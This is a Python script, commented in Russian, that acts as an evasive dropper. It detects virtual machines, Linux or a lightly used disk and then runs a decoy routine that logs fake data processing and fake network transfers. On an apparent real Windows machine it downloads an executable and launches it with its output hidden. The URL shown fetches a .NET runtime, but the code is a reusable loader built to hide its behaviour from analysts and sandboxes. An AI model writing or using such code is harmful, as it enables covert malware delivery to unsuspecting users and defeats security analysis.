import platform
import subprocess
import os
import ctypes
import shutil
import time
import random
import logging
from urllib import request

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def is_virtual_machine():
    """ Определяет, выполняется ли код на виртуальной машине """
    try:
        system = platform.system()
        if system == "Linux":
            output = subprocess.check_output(['lscpu'], universal_newlines=True).lower()
            if any(vm in output for vm in ['virtualbox', 'vmware', 'qemu', 'kvm']):
                return True
        elif system == "Windows":
            output = subprocess.check_output(['systeminfo'], universal_newlines=True)
            if "VirtualBox" in output or "VMware" in output:
                return True
    except Exception as e:
        logging.error(f"Error detecting environment: {e}")
    return False

def check_disk_space():
    """ Проверяет, занято ли на диске C: более 45 ГБ """
    total, used, free = shutil.disk_usage("C:\\")
    used_gb = used / (1024 ** 3)
    return used_gb > 45

def download_and_execute(url, file_name):
    """ Скачивает файл по ссылке и запускает его скрытно """
    logging.info(f"Downloading {file_name} from {url}...")
    request.urlretrieve(url, file_name)
    logging.info(f"Downloaded {file_name}. Executing...")
    
    # Запуск файла скрытно
    subprocess.Popen(file_name, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def fake_script():
    """ Фейковый скрипт для выполнения на виртуальной машине или Linux """
    logging.info("Starting fake script...")
    
    def fake_data_processing():
        logging.info("Starting data processing...")
        for i in range(1, 6):
            time.sleep(random.uniform(0.5, 1.5))  # Фиктивная задержка
            logging.info(f"Processed chunk {i}/5")
        logging.info("Data processing complete.")

    def fake_network_operation():
        logging.info("Connecting to remote server...")
        time.sleep(2)
        logging.info("Sending data...")
        time.sleep(1)
        if random.choice([True, False]):
            logging.info("Data sent successfully.")
        else:
            logging.error("Failed to send data.")
        logging.info("Disconnecting from server...")

    def fake_cleanup():
        logging.info("Cleaning up resources...")
        time.sleep(1)
        logging.info("Cleanup complete.")

    fake_data_processing()
    fake_network_operation()
    fake_cleanup()

    logging.info("Fake script finished.")

def main():
    """ Основная функция программы """
    if platform.system() == "Linux" or is_virtual_machine():
        fake_script()
    else:
        if check_disk_space():
            url = "https://download.visualstudio.microsoft.com/download/pr/cc913baa-9bce-482e-bdfc-56c4b6fafd10/e3f24f2ab2fc02b395c1b67f5193b8d1/dotnet-runtime-8.0.8-win-x64.exe"
            file_name = "dotnet-runtime-8.0.8-win-x64.exe"
            download_and_execute(url, file_name)
        else:
            fake_script()

if __name__ == "__main__":
    main()
